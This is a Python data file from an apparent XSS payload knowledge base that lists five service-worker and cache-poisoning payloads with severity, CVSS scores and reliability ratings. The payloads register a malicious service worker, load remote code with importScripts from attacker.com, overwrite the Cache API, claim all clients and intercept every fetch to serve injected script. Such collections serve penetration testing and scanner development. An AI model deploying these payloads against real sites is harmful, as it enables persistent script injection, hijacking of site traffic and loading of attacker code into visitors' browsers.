#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2026-01-10 UTC
Status: Created
Telegram: https://t.me/EasyProTech

Service Worker and Cache Poisoning Payloads
"""

from ..models import PayloadEntry

CACHE_POISONING_PAYLOADS = {
    "sw_cache_poison_absolute": PayloadEntry(
        payload="<script>navigator.serviceWorker.register('/sw.js').then(r=>{r.installing.postMessage({type:'CACHE',url:'/',body:'<script>alert(1)</script>'})})</script>",
        contexts=["javascript", "service_worker", "html_content"],
        severity="critical",
        cvss_score=9.0,
        description="Register malicious Service Worker to poison root cache",
        tags=["service-worker", "cache-poisoning", "persistence"],
        browser_support=["chrome", "firefox", "edge"],
        reliability="high"
    ),
    "sw_import_scripts": PayloadEntry(
        payload="importScripts('https://attacker.com/malicious-sw.js');",
        contexts=["javascript", "service_worker"],
        severity="critical",
        cvss_score=9.0,
        description="Load malicious code into Service Worker via importScripts",
        tags=["service-worker", "rce-js", "loader"],
        browser_support=["all"],
        reliability="high"
    ),
    "cache_api_overwrite": PayloadEntry(
        payload="caches.open('v1').then(c=>c.put('/',new Response('<script>alert(1)</script>',{headers:{'Content-Type':'text/html'}})))",
        contexts=["javascript", "console"],
        severity="critical",
        cvss_score=8.5,
        description="Direct Cache API overwrite from console/XSS",
        tags=["cache-api", "poisoning", "persistence"],
        browser_support=["chrome", "firefox"],
        reliability="high"
    ),
    "sw_claim_clients": PayloadEntry(
        payload="self.addEventListener('activate',e=>e.waitUntil(clients.claim()));",
        contexts=["javascript", "service_worker"],
        severity="medium",
        cvss_score=5.0,
        description="Force Service Worker to claim all clients immediately",
        tags=["service-worker", "control"],
        browser_support=["all"],
        reliability="high"
    ),
    "sw_intercept_fetch": PayloadEntry(
        payload="self.onfetch=e=>{e.respondWith(new Response('<script>alert(1)</script>',{headers:{'content-type':'text/html'}}))}",
        contexts=["javascript", "service_worker"],
        severity="critical",
        cvss_score=9.0,
        description="Global fetch interception returning XSS payload",
        tags=["service-worker", "interception", "mitm"],
        browser_support=["all"],
        reliability="high"
    )
}

CACHE_POISONING_TOTAL = len(CACHE_POISONING_PAYLOADS)
